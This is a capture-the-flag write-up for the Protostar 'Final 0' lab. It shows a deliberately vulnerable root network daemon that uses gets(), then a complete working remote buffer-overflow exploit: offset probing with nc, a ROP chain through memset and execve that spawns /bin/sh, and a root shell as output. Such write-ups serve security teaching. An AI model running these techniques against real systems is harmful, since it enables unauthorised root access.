# Protostar - Final 0

### About ###

>This level combines a stack overflow and network programming for a remote overflow.
>
>**Hints:** depending on where you are returning to, you may wish to use a toupper() proof shellcode.
>
>Core files will be in /tmp.
>
>This level is at /opt/protostar/bin/final0

### Source code

```c
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
```

### Solution 

This challenge is the final one about stack buffer overflows. 

The call to the function `gets` allows us to remotely exploit the program. The main problem with this program is the use of `toupper` that could potentially change our payload.

The first step is to locate the offset needed to reach the saved `eip`.

```
user@protostar:~$ for i in $(seq 1 40); do echo Offset $i; python -c "print 'A'*(512+$i)" | nc localhost 2995; done;
Offset 1
No such user AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[...]
Offset 19
No such user AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Offset 20
Offset 21
Offset 22
Offset 23
[...]
```

The program stop responding when we write more than 532 characters which means the saved `eip` is here.

We are going to use techniques such as ROP and ret2libc in order to exploit this program. 
Fortunately, the functions `memset` and `execve` are used in the program, which means we can directly access them via the PLT.

```
user@protostar:~$ objdump -TR /opt/protostar/bin/final0
[...]
0804adc4 R_386_JUMP_SLOT   memset
[...]
0804ae0c R_386_JUMP_SLOT   execve
[...]
```

`execve("/bin/sh", NULL, NULL)` will be used to get a shell, but first, we need to have the string `/bin/sh` somewhere in memory and that's what `memset` is for.

we are going to write `/bin/sh` at the address `0xbffeff00` which is an address on the stack where we have read-write permissions. We will do this one byte at a time with the following rop-chain generated in Python:

```python
def p(i):
    return struct.pack('<I', i)
    
memset = p(0x08048aec)
p3_ret = p(0x08049906)
binsh = 0xbffeff00

for k, v in enumerate('/bin/sh'):
        exp += memset			# address of memset@plt
        exp += p3_ret 			# return address -> gadget pop-pop-pop-ret
        exp += p(binsh + k) 	# 1st arg of memset -> 0xbffeff00 + k
        exp += p(ord(v))		# 2nd arg of memset -> one of the characters of "/bin/sh"
        exp += p(0x00000001)	# 3rd arg of memset -> length
```

Now we can get a shell with `execve`:

```python
execve = p(0x08048c0c)

exp += execve	 		# address of execve@plt
exp += p(0xdeadbeef) 	# return address -> won't be reached
exp += p(binsh)			# address to our string "/bin/sh"
exp += p(0xbfff0000)	# pointer to 0
exp += p(0xbfff0000)	
```

```
user@protostar:~$ (python fnr.py; cat;) | nc localhost 2995
id
uid=0(root) gid=0(root) groups=0(root)
```

Here's the final exploit in Python:

```python
import socket
import struct

def p(i):
    return struct.pack('<I', i)

memset = p(0x08048aec)
execve = p(0x08048c0c)
p3_ret = p(0x08049906)
binsh = 0xbffeff00

exp = ''
exp += 'A' * 532

for k, v in enumerate('/bin/sh'):
        exp += memset
        exp += p3_ret
        exp += p(binsh + k)
        exp += p(ord(v))
        exp += p(0x00000001)

exp += execve
exp += p(0xdeadbeef)
exp += p(binsh)
exp += p(0xbfff0000)
exp += p(0xbfff0000)

print exp
```